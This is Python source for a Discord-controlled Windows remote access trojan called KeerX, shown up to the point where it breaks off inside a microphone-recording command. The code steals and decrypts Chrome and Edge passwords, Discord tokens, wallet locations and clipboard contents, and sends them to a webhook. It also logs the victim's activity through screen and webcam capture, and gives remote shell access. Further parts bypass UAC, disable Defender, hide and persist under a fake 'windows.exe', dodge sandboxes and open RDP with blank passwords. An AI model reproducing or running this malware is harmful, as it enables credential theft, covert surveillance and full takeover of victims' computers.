# Standard Imports
import ssl, os, sys, subprocess, sqlite3, io, threading, time, socket, random, shutil, re, requests, json, base64, hashlib, ctypes, platform, wave
from ctypes import wintypes

# SSL Fixes
try:
    import certifi
    os.environ['SSL_CERT_FILE'] = certifi.where()
    ssl._create_default_https_context = ssl._create_unverified_context
except: pass

# Optional/Heavy Imports (Guarded for Resilience)
try: import discord
except: pass
try: from discord.ext import commands, tasks
except: pass
try: import asyncio
except: pass
try: 
    import win32api, win32con, win32gui, win32process
except: win32api = win32con = win32gui = win32process = None
try: import psutil
except: psutil = None
try: import pyautogui
except: pyautogui = None
try: import cv2
except: cv2 = None
try: import numpy as np
except: np = None
try: from PIL import ImageGrab, Image
except: ImageGrab = Image = None
try: from cryptography.fernet import Fernet
except: Fernet = None
try: import keyboard
except: keyboard = None
try: import mouse
except: mouse = None
try: import winreg
except: winreg = None
try: import wmi
except: wmi = None
try: import pyaudio
except: pyaudio = None
try: import GPUtil
except: GPUtil = None
try: import pyttsx3
except: pyttsx3 = None
try: import pynput
except: pynput = None
try: 
    import scapy.all as scapy
    import logging
    logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
except: scapy = None
try:
    from comtypes import CLSCTX_ALL
    from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
except: 
    AudioUtilities = IAudioEndpointVolume = None

# Bot setup
intents = discord.Intents.default()
intents.message_content = True
intents.members = True
bot = commands.Bot(command_prefix='!', intents=intents)
bot.remove_command('help')

# Globals
live_screen_thread = None
live_screen_active = False
live_webcam_thread = None
live_webcam_active = False
live_mic_active = False
live_mic_thread = None
keylog_buffer = []
keylog_active = False
keylog_file = "keyhistory.txt"
is_admin = False
mutex = None
VERSION = "1.2"
VERSION_URL = "https://raw.githubusercontent.com/XdKeerXd/discord-bot/main/version.txt"
RAW_CODE_URL = "https://raw.githubusercontent.com/XdKeerXd/discord-bot/main/python.py"
BACKUP_WEBHOOK = "YOUR_BACKUP_WEBHOOK_HERE"
victim_id = "Unknown"
clipboard_active = False
last_clipboard = ""

def clipboard_monitor():
    global last_clipboard, clipboard_active
    while True:
        if clipboard_active:
            try:
                import win32clipboard
                win32clipboard.OpenClipboard()
                data = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                if data != last_clipboard:
                    last_clipboard = data
                    send_to_webhook(f"📋 **Clipboard Update:**\n```{data}```")
            except: pass
        time.sleep(3)

threading.Thread(target=clipboard_monitor, daemon=True).start()

def get_installed_apps():
    apps = []
    keys = [
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"),
        (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Uninstall")
    ]
    for root, subkey in keys:
        try:
            with winreg.OpenKey(root, subkey) as key:
                for i in range(winreg.QueryInfoKey(key)[0]):
                    try:
                        app_root = winreg.EnumKey(key, i)
                        with winreg.OpenKey(key, app_root) as app_key:
                            name, _ = winreg.QueryValueEx(app_key, "DisplayName")
                            if name not in apps: apps.append(name)
                    except: pass
        except: pass
    return sorted(apps)

def get_master_key(path):
    try:
        with open(path, "r", encoding="utf-8") as f:
            local_state = json.loads(f.read())
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        import win32crypt
        return win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
    except: return None

def decrypt_password(password, master_key):
    try:
        iv = password[3:15]
        payload = password[15:]
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        aesgcm = AESGCM(master_key)
        return aesgcm.decrypt(iv, payload, None).decode()
    except: return "Decryption Failed"

def check_admin():
    try: return ctypes.windll.shell32.IsUserAnAdmin()
    except: return False

def write_key(key):
    with open(keylog_file, 'a') as f:
        f.write(f"[{time.strftime('%H:%M:%S')}] {key}\n")

# AV Evasion Logic (v4.6 Hardened)
def av_evasion():
    """Adds complex behavioral noise and checks to bypass modern AV/EDR"""
    try:
        # Behavioral Noise: Intensive Prime Calculation (legitimate CPU load)
        def is_prime(n):
            if n < 2: return False
            for i in range(2, int(n**0.5) + 1):
                if n % i == 0: return False
                return True
        _ = [i for i in range(1000) if is_prime(i)]
        
        # Static Noise: Browser-like WMI checks
        if wmi:
            w = wmi.WMI()
            _ = w.Win32_BaseBoard(); _ = w.Win32_BIOS()
        
        # Anti-Sandbox: Randomized long sleep
        time.sleep(random.randint(5, 15))
        
        # Environment Check: Exit if in virtualized/tiny environment
        mem = psutil.virtual_memory().total
        if mem < 4 * (1024**3): return os._exit(0) # 4GB min
        if psutil.cpu_count() < 2: return os._exit(0) # Dual core min
    except: pass

@bot.command()
async def exclude(ctx):
    """Add KeerX to Defender Exclusions (Admin)"""
    if not is_admin: return await ctx.send("❌ Admin privileges required.")
    await ctx.send("🛡️ **Applying Defender Exclusions...**")
    try:
        path = os.path.dirname(os.path.abspath(sys.executable if getattr(sys, 'frozen', False) else __file__))
        cmd = f"powershell -Command \"Add-MpPreference -ExclusionPath '{path}'\""
        subprocess.run(cmd, shell=True, capture_output=True)
        await ctx.send(f"✅ Excluded: `{path}`")
    except Exception as e: await ctx.send(f"❌ Exclusion Failed: {e}")

@bot.command()
async def defender_off(ctx):
    """Attempt to disable Real-Time Protection (Admin)"""
    if not is_admin: return await ctx.send("❌ Admin privileges required.")
    await ctx.send("🛡️ **Attempting to disable Defender...**")
    try:
        subprocess.run("powershell -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\"", shell=True)
        await ctx.send("✅ Real-time monitoring disabled (if not blocked by Tamper Protection).")
    except Exception as e: await ctx.send(f"❌ Failed: {e}")

# Persistence & Stealth Logic (Clean version)
def stealth_and_persist():
    try:
        current_path = os.path.abspath(sys.executable)
        if not current_path.endswith(".exe"): return
        
        appdata = os.getenv('APPDATA')
        target_dir = os.path.join(appdata, "WindowsServices")
        target_path = os.path.join(target_dir, "windows.exe")
        
        # Ensure target directory exists and is hidden
        if not os.path.exists(target_dir):
            os.makedirs(target_dir, exist_ok=True)
            subprocess.run(['attrib', '+h', target_dir], shell=True)
        
        # If we are not running from the stealth location, migrate
        if current_path.lower() != target_path.lower():
            if os.path.exists(target_path):
                try: os.remove(target_path)
                except: pass
            shutil.copy2(current_path, target_path)
            
            # Startup Persistence (Browser.exe for user visibility)
            startup_path = os.path.join(appdata, r'Microsoft\Windows\Start Menu\Programs\Startup', "browser.exe")
            if not os.path.exists(startup_path):
                shutil.copy2(target_path, startup_path)
            
            # Launch stealth process and exit
            subprocess.Popen([target_path], shell=True)
            os._exit(0)
    except: pass

# Single Instance Lock
def is_running():
    global mutex
    mutex = ctypes.windll.kernel32.CreateMutexW(None, False, "KeerX_RAT_Mutex")
    if ctypes.windll.kernel32.GetLastError() == 183: # ERROR_ALREADY_EXISTS
        return True
    return False

def check_for_updates():
    try:
        r = requests.get(VERSION_URL, timeout=5)
        if r.status_code == 200:
            remote_version = r.text.strip().split('\n')[-1]
            if remote_version != VERSION:
                new_code_res = requests.get(RAW_CODE_URL, timeout=10)
                if new_code_res.status_code == 200 and "import discord" in new_code_res.text:
                    with open(__file__, 'w', encoding='utf-8') as f:
                        f.write(new_code_res.text)
                    subprocess.Popen([sys.executable, __file__])
                    os._exit(0)
    except: pass

def send_to_webhook(content):
    if BACKUP_WEBHOOK == "YOUR_BACKUP_WEBHOOK_HERE": return
    try: requests.post(BACKUP_WEBHOOK, json={"content": content})
    except: pass

@bot.event
async def on_ready():
    global is_admin, victim_id
    is_admin = check_admin()
    victim_id = f"{bot.user.name}_{socket.gethostname()}"
    print(f'{bot.user} connected - Admin: {"✅" if is_admin else "❌"}')
    send_to_webhook(f"🚀 **KeerX v4.4 Online!**\n👤 User: `{os.getenv('USERNAME')}`\n👑 Admin: `{'Yes' if is_admin else 'No'}`\n📍 ID: `{victim_id}`")

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound): return
    await ctx.send(f"❌ **Command Error:** `{str(error)}`")

@bot.event
async def on_message(message):
    if message.author == bot.user:
        return
    
    # Targeting Check
    content = message.content.split()
    if len(content) > 1 and content[0].startswith('!'):
        target = content[-1].lower()
        if target not in ["all", victim_id.lower(), socket.gethostname().lower()]:
            # This message is not for us
            return

    await bot.process_commands(message)

   # MEGA PORTAL UI (25-BUTTON GRID)
class MegaPortal(discord.ui.View):
    def __init__(self, ctx):
        super().__init__(timeout=None)
        self.ctx = ctx
    
    # ROW 0: SURVEILLANCE
    @discord.ui.button(label="📸 Snap", style=discord.ButtonStyle.primary, row=0)
    async def btn_snap(self, interaction, button):
        await interaction.response.defer()
        await self.ctx.invoke(bot.get_command('screenshot'))

    @discord.ui.button(label="📹 Cam", style=discord.ButtonStyle.primary, row=0)
    async def btn_cam(self, interaction, button):
        await interaction.response.defer()
        await self.ctx.invoke(bot.get_command('webcam'))

    @discord.ui.button(label="🎤 Mic", style=discord.ButtonStyle.primary, row=0)
    async def btn_mic(self, interaction, button):
        await interaction.response.defer()
        await self.ctx.invoke(bot.get_command('micstream'))

    @discord.ui.button(label="📺 LiveScr", style=discord.ButtonStyle.success, row=0)
    async def btn_livescr(self, interaction, button):
        await interaction.response.defer()
        await self.ctx.invoke(bot.get_command('livestream'))

    @discord.ui.button(label="🔴 LiveCam", style=discord.ButtonStyle.danger, row=0)
    async def btn_livecam(self, interaction, button):
        await interaction.response.defer()
        await self.ctx.invoke(bot.get_command('webcamstream'))

    # ROW 1: EXFIL
    @discord.ui.button(label="💎 Tokens", style=discord.ButtonStyle.primary, row=1)
    async def btn_tokens(self, interaction, button):
        await interaction.response.defer()
        await self.ctx.invoke(bot.get_command('discord_tokens'))

    @discord.ui.button(label="💰 Wallet", style=discord.ButtonStyle.primary, row=1)
    async def btn_wallet(self, interaction, button):
        await interaction.response.defer()
        await self.ctx.invoke(bot.get_command('wallet_scan'))

    @discord.ui.button(label="🔐 Steal", style=discord.ButtonStyle.danger, row=1)
    async def btn_steal(self, interaction, button):
        await interaction.response.defer()
        await self.ctx.invoke(bot.get_command('browser_steal'))

    @discord.ui.button(label="📋 Clip", style=discord.ButtonStyle.secondary, row=1)
    async def btn_clip(self, interaction, button):
        await interaction.response.defer()
        await self.ctx.invoke(bot.get_command('clipboard'))

    @discord.ui.button(label="📁 Files", style=discord.ButtonStyle.secondary, row=1)
    async def btn_files(self, interaction, button):
        await interaction.response.defer()
        await self.ctx.invoke(bot.get_command('files'))

    # ROW 2: TROLLING
    @discord.ui.button(label="📢 TTS", style=discord.ButtonStyle.secondary, row=2)
    async def btn_tts(self, interaction, button):
        await interaction.response.send_message("📢 Type `!tts <text> all` to speak.", ephemeral=True)

    @discord.ui.button(label="🖼️ WP", style=discord.ButtonStyle.secondary, row=2)
    async def btn_wp(self, interaction, button):
        await interaction.response.send_message("🖼️ Type `!wallpaper <url> all` to change.", ephemeral=True)

    @discord.ui.button(label="🎞️ FakeUp", style=discord.ButtonStyle.secondary, row=2)
    async def btn_fup(self, interaction, button):
        await interaction.response.defer()
        await self.ctx.invoke(bot.get_command('fakeupdate'))

    @discord.ui.button(label="🎭 Msg", style=discord.ButtonStyle.secondary, row=2)
    async def btn_msg(self, interaction, button):
        await interaction.response.send_message("💡 Type `!msgbox <text> <title> [target]` for popup.", ephemeral=True)

    @discord.ui.button(label="⌨️ Swap", style=discord.ButtonStyle.secondary, row=2)
    async def btn_swap(self, interaction, button):
        await interaction.response.defer()
        await self.ctx.invoke(bot.get_command('keyswap'))

    # ROW 3: SYSTEM & CONTROL
    @discord.ui.button(label="👑 UAC", style=discord.ButtonStyle.danger, row=3)
    async def btn_uac(self, interaction, button):
        await interaction.response.defer()
        await self.ctx.invoke(bot.get_command('uacbypass'))

    @discord.ui.button(label="🌑 Blackout", style=discord.ButtonStyle.danger, row=3)
    async def btn_black(self, interaction, button):
        await interaction.response.defer()
        await self.ctx.invoke(bot.get_command('blackout'))

    @discord.ui.button(label="⚙️ Persist", style=discord.ButtonStyle.danger, row=3)
    async def btn_persist(self, interaction, button):
        await interaction.response.defer()
        await self.ctx.invoke(bot.get_command('persist'))

    @discord.ui.button(label="🛰️ RDP", style=discord.ButtonStyle.danger, row=3)
    async def btn_rdp(self, interaction, button):
        await interaction.response.defer()
        await self.ctx.invoke(bot.get_command('rdp'))

    @discord.ui.button(label="🧯 Status", style=discord.ButtonStyle.success, row=3)
    async def btn_stat(self, interaction, button):
        await interaction.response.defer()
        await self.ctx.invoke(bot.get_command('status'))

    # ROW 4: TOOLS & EXIT
    @discord.ui.button(label="🔍 Scout", style=discord.ButtonStyle.primary, row=4)
    async def btn_scout(self, interaction, button):
        await interaction.response.defer()
        await self.ctx.invoke(bot.get_command('scout'))

    @discord.ui.button(label="📡 Sniff", style=discord.ButtonStyle.success, row=4)
    async def btn_snif(self, interaction, button):
        await interaction.response.defer()
        await self.ctx.invoke(bot.get_command('sniffer'))

    @discord.ui.button(label="🌐 Net", style=discord.ButtonStyle.success, row=4)
    async def btn_net(self, interaction, button):
        await interaction.response.defer()
        await self.ctx.invoke(bot.get_command('netscan'))

    @discord.ui.button(label="📍 Geo", style=discord.ButtonStyle.success, row=4)
    async def btn_geo(self, interaction, button):
        await interaction.response.defer()
        await self.ctx.invoke(bot.get_command('geolocate'))

    @discord.ui.button(label="💥 MELT", style=discord.ButtonStyle.danger, row=4)
    async def btn_melt(self, interaction, button):
        await interaction.response.defer()
        await self.ctx.invoke(bot.get_command('melt'))

# COMMANDS
@bot.command()
async def scout(ctx):
    """Deep System Reconnaissance"""
    if not psutil: return await ctx.send("❌ `psutil` missing.")
    await ctx.send("🔍 **Scouting target system...**")
    try:
        cpu = platform.processor()
        ram = f"{round(psutil.virtual_memory().total / (1024**3), 2)} GB"
        gpu_info = "None"
        if GPUtil:
            gpus = GPUtil.getGPUs()
            if gpus: gpu_info = gpus[0].name
        hw_msg = f"💻 **Hardware:**\nCPU: `{cpu}`\nRAM: `{ram}`\nGPU: `{gpu_info}`\nOS: `{platform.system()} {platform.release()}`"
        
        # Processes
        procs = sorted([p.info['name'] for p in psutil.process_iter(['name']) if p.info['name']])
        proc_msg = "**🔄 Top Processes:**\n`" + ", ".join(procs[:15]) + "...`"
        
        # Installed Apps
        apps = get_installed_apps()
        app_msg = f"📦 **Total Apps:** `{len(apps)}`"
        
        embed = discord.Embed(title="🕵️ KeerX Scout Report", color=0x3498db)
        embed.add_field(name="System", value=hw_msg, inline=False)
        embed.add_field(name="Processes", value=proc_msg, inline=False)
        embed.add_field(name="Apps", value=app_msg, inline=False)
        await ctx.send(embed=embed)
        
        # Send app list as file if needed
        app_list = "\n".join(apps)
        with io.BytesIO(app_list.encode()) as f:
            await ctx.send("Full app list:", file=discord.File(f, "apps.txt"))
            
    except Exception as e: await ctx.send(f"❌ Scout Error: {e}")

@bot.command()
async def msgbox(ctx, text, title="Message"):
    """Show interactive MessageBox"""
    await ctx.send(f"💬 Sending Message: `{text}`")
    res = await asyncio.to_thread(lambda: ctypes.windll.user32.MessageBoxW(0, text, title, 0x40 | 0x1))
    btn = {1: "OK", 2: "Cancel"}.get(res, str(res))
    await ctx.send(f"🔘 User clicked: `{btn}`")

@bot.command(name='c', aliases=['mega'])
async def portal(ctx):
    """Launch the MegaPortal UI"""
    embed = discord.Embed(title=f"💀 KeerX Portal | {socket.gethostname()}", description="**v4.2 Mass Fix Update**", color=0xff0000)
    embed.set_thumbnail(url="https://i.imgur.com/8N88n3O.png")
    embed.add_field(name="👤 User", value=f"`{os.getenv('USERNAME')}`", inline=True)
    embed.add_field(name="📍 Victim ID", value=f"`{victim_id}`", inline=True)
    embed.add_field(name="🧠 Active Window", value=f"`{win32gui.GetWindowText(win32gui.GetForegroundWindow())[:20]}`", inline=False)
    
    # Adding simplified help categories to the Portal embed
    categories = (
        "📸 **Surveillance**: Snap, Cam, Mic, LiveScr, LiveCam\n"
        "🔐 **Exfiltration**: Tokens, Wallet, Steal, Clip, Files, Scout\n"
        "🛰️ **Remote**: RDP, Net, Sniff, Geo\n"
        "🎭 **Trolling**: TTS, WP, FakeUp, Msg, Swap\n"
        "⚙️ **System**: UAC, Blackout, Persist, Status, Melt"
    )
    embed.add_field(name="🛠️ Available Categories", value=categories, inline=False)
    
    embed.set_footer(text=f"Admin: {'✅' if is_admin else '❌'} | Use !help for full details")
    await ctx.send(embed=embed, view=MegaPortal(ctx))

@bot.command()
async def screenshot(ctx):
    """Capture full screen (Safe)"""
    if not ImageGrab: return await ctx.send("❌ `Pillow` missing.")
    try:
        img = ImageGrab.grab(all_screens=True)
        buf = io.BytesIO(); img.save(buf, format='PNG'); buf.seek(0)
        await ctx.send(file=discord.File(buf, 'snap.png'))
    except Exception as e: await ctx.send(f"❌ Screenshot Failed: {e}")

@bot.command()
async def webcam(ctx):
    """Capture single webcam frame (Safe)"""
    if not cv2: return await ctx.send("❌ `cv2` missing.")
    try:
        cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
        if not cap.isOpened(): return await ctx.send("❌ **Webcam:** No camera detected or already in use.")
        ret, frame = cap.read()
        if ret:
            _, buffer = cv2.imencode('.png', frame)
            await ctx.send(file=discord.File(io.BytesIO(buffer), 'webcam.png'))
        else: await ctx.send("❌ **Webcam:** Failed to read frame.")
        cap.release()
    except Exception as e: await ctx.send(f"❌ Webcam Error: {e}")

@bot.command()
async def livestream(ctx):
    """Start 30s Screen Stream"""
    await ctx.send("📺 **Starting Screen Stream (10s)...**")
    for _ in range(5):
        img = pyautogui.screenshot()
        buf = io.BytesIO(); img.save(buf, format='JPEG', quality=30); buf.seek(0)
        await ctx.send(file=discord.File(buf, 'stream.jpg'))
        await asyncio.sleep(2)

@bot.command()
async def webcamstream(ctx):
    """Start 30s Webcam Stream"""
    await ctx.send("🔴 **Starting Webcam Stream (10s)...**")
    cap = cv2.VideoCapture(0)
    for _ in range(5):
        ret, frame = cap.read()
        if ret:
            _, buffer = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 30])
            await ctx.send(file=discord.File(io.BytesIO(buffer), 'webcam.jpg'))
        await asyncio.sleep(2)
    cap.release()

@bot.command()
async def discord_tokens(ctx):
    """Extract Discord tokens"""
    tokens = []
    local = os.getenv('LOCALAPPDATA') or ""; roaming = os.getenv('APPDATA') or ""
    paths = {'Discord': os.path.join(roaming, 'discord', 'Local Storage', 'leveldb'), 'Chrome': os.path.join(local, 'Google', 'Chrome', 'User Data', 'Default', 'Local Storage', 'leveldb')}
    for name, path in paths.items():
        if not os.path.exists(path): continue
        for file in os.listdir(path):
            if file.endswith('.log') or file.endswith('.ldb'):
                for line in [x.strip() for x in open(f'{path}\\{file}', errors='ignore').readlines() if x.strip()]:
                    for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                        for token in re.findall(regex, line):
                            if token not in tokens: tokens.append(f"[{name}] {token}")
    await ctx.send(f"💎 **Tokens:**\n```\n" + ("\n".join(tokens) if tokens else "None") + "\n```")

@bot.command()
async def wallet_scan(ctx):
    """Scan for crypto wallets"""
    paths = [os.path.join(os.getenv('APPDATA'), x) for x in ['Zcash', 'Electrum', 'Exodus', 'Armory', 'bytecoin', 'Ethereum', 'Atomic', 'Guarda']]
    found = [p for p in paths if os.path.exists(p)]
    await ctx.send(f"💰 **Wallets Found:**\n" + ("\n".join([f"`{f}`" for f in found]) if found else "None"))

@bot.command()
async def browser_steal(ctx):
    """Extract and decrypt Chrome/Edge passwords"""
    await ctx.send("🔐 **Extracting browser credentials...**")
    logs = []
    browsers = {'Chrome': os.path.join(os.getenv('LOCALAPPDATA'), r'Google\Chrome\User Data'), 'Edge': os.path.join(os.getenv('LOCALAPPDATA'), r'Microsoft\Edge\User Data')}
    for name, path in browsers.items():
        master_key = get_master_key(os.path.join(path, "Local State"))
        if not master_key: continue
        db_path = os.path.join(path, "Default", "Login Data")
        if not os.path.exists(db_path): continue
        temp_db = "temp_login.db"
        shutil.copy(db_path, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        try:
            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
            for url, user, pwd in cursor.fetchall():
                if user:
                    decrypted_pwd = decrypt_password(pwd, master_key)
                    logs.append(f"🌐 **{name}** | `{url}`\n👤 `{user}` | 🔑 `{decrypted_pwd}`")
        except: pass
        conn.close(); os.remove(temp_db)
    if logs:
        for i in range(0, len(logs), 5): await ctx.send("\n".join(logs[i:i+5]))
    else: await ctx.send("❌ No credentials found or access denied.")

@bot.command()
async def uacbypass(ctx):
    """Attempt UAC Bypass"""
    await ctx.send("👑 **Attempting UAC Bypass...**")
    try:
        path = os.path.abspath(sys.executable if getattr(sys, 'frozen', False) else __file__)
        subprocess.run(['powershell', '-Command', f"New-Item -Path 'HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command' -Value '{path}' -Force"], capture_output=True)
        subprocess.run(['powershell', '-Command', "New-ItemProperty -Path 'HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command' -Name 'DelegateExecute' -Value '' -Force"], capture_output=True)
        subprocess.run(['fodhelper.exe'], shell=True)
        time.sleep(2)
        subprocess.run(['powershell', '-Command', "Remove-Item -Path 'HKCU:\\Software\\Classes\\ms-settings' -Recurse -Force"], capture_output=True)
    except Exception as e: await ctx.send(f"❌ UAC Bypass Failed: {e}")

@bot.command()
async def persist(ctx):
    """Install Persistence (Startup/Registry/Task)"""
    await ctx.send("⚙️ **Installing persistence...**")
    try:
        path = os.path.abspath(sys.executable if getattr(sys, 'frozen', False) else __file__)
        appdata = os.getenv('APPDATA')
        target = os.path.join(appdata, "WindowsServices", "windows.exe")
        
        # Ensure we are in the stealth location first
        if not os.path.exists(target):
            os.makedirs(os.path.dirname(target), exist_ok=True)
            shutil.copy2(path, target)
        
        # Registry
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "WindowsServiceHost", 0, winreg.REG_SZ, f'"{target}"')
        
        # Task
        os.system(f'schtasks /create /tn "Windows_Service_Update" /tr "{target}" /sc onlogon /rl highest /f')
        await ctx.send("✅ Persistence methods verified and active.")
    except Exception as e: await ctx.send(f"❌ Persistence Failed: {e}")

@bot.command()
async def rdp(ctx):
    """Enable Remote Desktop (No Admin Guard)"""
    await ctx.send("🛰️ **Enabling RDP...**")
    try:
        subprocess.run(['powershell', '-Command', "Set-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server' -Name 'fDenyTSConnections' -Value 0"], capture_output=True)
        subprocess.run(['netsh', 'advfirewall', 'firewall', 'set', 'rule', 'group="remote desktop"', 'new', 'enable=Yes'], capture_output=True)
        subprocess.run(['powershell', '-Command', "Set-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\Control\\Lsa' -Name 'LimitBlankPasswordUse' -Value 0"], capture_output=True)
        await ctx.send("✅ RDP Configured. Connect via `mstsc.exe` to local IP.")
    except Exception as e: await ctx.send(f"❌ RDP Error: {e}")

@bot.command()
async def kill(ctx, *, name):
    """Force kill a process by name"""
    await ctx.send(f"⚔️ **Killing process:** `{name}`")
    try:
        count = 0
        for proc in psutil.process_iter():
            if name.lower() in proc.name().lower():
                proc.kill()
                count += 1
        await ctx.send(f"✅ Terminated {count} instances of `{name}`.")
    except Exception as e: await ctx.send(f"❌ Kill Error: {e}")

@bot.command()
async def grab(ctx, *, path):
    """Download a file from the victim"""
    path = os.path.abspath(path)
    if not os.path.exists(path): return await ctx.send("❌ File not found.")
    await ctx.send(f"📥 **Grabbing:** `{os.path.basename(path)}`...")
    try: await ctx.send(file=discord.File(path))
    except Exception as e: await ctx.send(f"❌ Grab Error: {e}")

@bot.command()
async def upload(ctx, url, filename):
    """Upload a file to the victim via URL"""
    await ctx.send(f"📤 **Uploading:** `{filename}`...")
    try:
        r = requests.get(url, stream=True, timeout=10)
        with open(filename, 'wb') as f:
            for chunk in r.iter_content(chunk_size=8192): f.write(chunk)
        await ctx.send(f"✅ Uploaded to `{os.path.abspath(filename)}`.")
    except Exception as e: await ctx.send(f"❌ Upload Error: {e}")

@bot.command()
async def voice(ctx, *, text):
    """Speak text at max volume"""
    await ctx.send(f"🗣️ **Speaking:** `{text}`")
    try:
        # Try to set system volume to 100% first
        try:
            from ctypes import cast, POINTER
            from comtypes import CLSCTX_ALL
            from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
            devices = AudioUtilities.GetSpeakers()
            interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
            volume = cast(interface, POINTER(IAudioEndpointVolume))
            volume.SetMasterVolumeLevelScalar(1.0, None)
        except: pass
        
        engine = pyttsx3.init()
        engine.setProperty('rate', 150)
        engine.say(text)
        engine.runAndWait()
    except Exception as e: await ctx.send(f"❌ Voice Error: {e}")

@bot.command()
async def taskmgr_off(ctx):
    """Disable Task Manager"""
    try:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        await ctx.send("🔒 **Task Manager disabled.**")
    except Exception as e: await ctx.send(f"❌ Error: {e}")

@bot.command()
async def taskmgr_on(ctx):
    """Enable Task Manager"""
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, "DisableTaskMgr")
        await ctx.send("🔓 **Task Manager enabled.**")
    except Exception as e: await ctx.send(f"❌ Error: {e}")

@bot.command()
async def status(ctx):
    """Get Bot/System Status"""
    if not psutil: return await ctx.send("🛰️ **Status:** Up | `psutil missing`.")
    uptime = time.time() - psutil.boot_time()
    await ctx.send(f"🛰️ **Status:** Up | ID: `{victim_id}`\nUptime: `{int(uptime/3600)}h {int((uptime%3600)/60)}m`\nCPU: `{psutil.cpu_percent()}%` | RAM: `{psutil.virtual_memory().percent}%`")

@bot.command()
async def thermal(ctx):
    """Get CPU Thermal (Safe check)"""
    if not wmi: return await ctx.send("🌡️ **Thermal:** `wmi module missing.`")
    try:
        w = wmi.WMI(namespace="root\\wmi")
        temps = w.MSAcpi_ThermalZoneTemperature()
        if temps:
            temp = (temps[0].CurrentTemperature / 10.0) - 273.15
            await ctx.send(f"🌡️ **CPU Temperature:** `{temp:.1f}°C`")
        else:
            await ctx.send("🌡️ **Thermal:** `No sensor data provided by WMI.`")
    except: await ctx.send("🌡️ **Thermal:** `Access denied or no thermal sensors available.`")

@bot.command()
async def shell(ctx, *, command):
    """Execute CMD command"""
    await ctx.send(f"💻 **Executing CMD:** `{command}`")
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT).decode('cp437')
        await ctx.send(f"```\n{output[:1900]}\n```")
    except Exception as e: await ctx.send(f"❌ Error: {e}")

@bot.command()
async def powershell(ctx, *, command):
    """Execute PowerShell command"""
    await ctx.send(f"🌌 **Executing PowerShell:** `{command}`")
    try:
        output = subprocess.check_output(['powershell', '-Command', command], stderr=subprocess.STDOUT).decode('cp437')
        await ctx.send(f"```\n{output[:1900]}\n```")
    except Exception as e: await ctx.send(f"❌ Error: {e}")

@bot.command()
async def netscan(ctx):
    """Scan local network for devices"""
    output = subprocess.check_output("arp -a", shell=True).decode()
    await ctx.send(f"```\n{output[:1900]}\n```")

@bot.command()
async def geolocate(ctx):
    """IP Geolocation"""
    r = requests.get("http://ip-api.com/json/").json()
    await ctx.send(f"📍 **Location:** {r.get('city')}, {r.get('country')} ({r.get('query')})")

@bot.command()
async def clipboard(ctx):
    """Toggle Clipboard Monitor"""
    global clipboard_active
    clipboard_active = not clipboard_active
    await ctx.send(f"📋 **Clipboard Monitor:** {'ON' if clipboard_active else 'OFF'}")

@bot.command()
async def ip(ctx):
    """Get IP and Network Details (v4.5)"""
    try:
        r = requests.get("https://api.ipify.org?format=json").json()
        pub_ip = r.get('ip', 'Unknown')
        loc = requests.get(f"http://ip-api.com/json/{pub_ip}").json()
        isp = loc.get('isp', 'Unknown')
        addr = f"{loc.get('city', 'Unknown')}, {loc.get('country', 'Unknown')}"
        msg = f"🌐 **IP Report (KeerX v4.5)**\nPublic: `{pub_ip}`\nLocal: `{socket.gethostbyname(socket.gethostname())}`\nISP: `{isp}`\nLocation: `{addr}`"
        await ctx.send(msg)
    except Exception as e: await ctx.send(f"❌ IP Error: {e}")

@bot.command()
async def screenrecord(ctx, duration: int = 5):
    """Record screen for X seconds"""
    if not cv2 or not pyautogui or not ImageGrab: return await ctx.send("❌ `cv2/pyautogui/Pillow` missing.")
    if duration > 30: return await ctx.send("❌ Max 30 seconds.")
    await ctx.send(f"🎥 **Recording Screen ({duration}s)...**")
    try:
        path = os.path.join(os.getenv('TEMP', '.'), "rec.mp4")
        screen_size = pyautogui.size()
        fourcc = cv2.VideoWriter_fourcc(*'mp4v')
        out = cv2.VideoWriter(path, fourcc, 10.0, screen_size)
        
        start_time = time.time()
        while (time.time() - start_time) < duration:
            img = ImageGrab.grab()
            frame = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
            out.write(frame)
        out.release()
        await ctx.send(file=discord.File(path))
        os.remove(path)
    except Exception as e: await ctx.send(f"❌ ScreenRecord Error: {e}")

@bot.command()
async def files(ctx):
    """List local directory"""
    await ctx.send(f"📁 **Files:**\n```\n" + "\n".join(os.listdir('.')[:20]) + "\n```")

@bot.command()
async def micstream(ctx, duration=10):
    """Record microphone audio (v4.7 resilience)"""
